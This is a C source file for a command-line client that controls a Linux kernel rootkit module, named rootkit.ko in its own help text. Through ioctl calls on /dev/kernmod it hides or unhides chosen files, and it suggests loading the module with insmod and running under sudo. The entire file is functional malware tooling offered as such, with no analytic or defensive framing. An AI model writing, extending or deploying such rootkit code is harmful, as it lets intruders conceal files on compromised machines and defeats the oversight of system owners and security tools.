#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include "common.h"

int main(int argc, char *argv[])
{
    if (argc < 2) {
        return 1;
    }

    int fd = open("/dev/kernmod", O_RDWR);

    if (fd < 0) {
        perror("open /dev/kernmod");
        if (errno == ENOENT)
            fprintf(stderr, "Is the kernel module loaded? Try: sudo insmod rootkit.ko\n");
        else if (errno == EACCES)
            fprintf(stderr, "Permission denied. Try running with sudo.\n");
        return 1;
    }

    char buf[MAX_HIDDEN_NAME] = {0};
    int ret = 0; 

    if (strcmp(argv[1], "hide-file") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Error: filename required\n");
            close(fd);
            return 1;
        }
        strncpy(buf, argv[2], sizeof(buf) - 1);
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        
        ret = ioctl(fd, IOCTL_HIDE_FILE, buf);
        if (ret < 0) {
            if (errno == EEXIST)
                fprintf(stderr, "File '%s' is already hidden\n", argv[2]);
            else
                perror("ioctl HIDE_FILE failed");
        } else {
            printf("File '%s' is now hidden\n", argv[2]);
        }

    } else if (strcmp(argv[1], "unhide-file") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Error: filename required\n");
            close(fd);
            return 1;
        }
        strncpy(buf, argv[2], sizeof(buf) - 1);

        ret = ioctl(fd, IOCTL_UNHIDE_FILE, buf);
        if (ret < 0) {
            if (errno == ENOENT)
                fprintf(stderr, "File '%s' is not in the hidden list\n", argv[2]);
            else
                perror("ioctl UNHIDE_FILE failed");
        } else {
            printf("File '%s' is now visible\n", argv[2]);
        }

    } else {
        fprintf(stderr, "Unknown command: %s\n", argv[1]);
        close(fd);
        return 1;
    }

    close(fd);
    return (ret < 0) ? 1 : 0;
}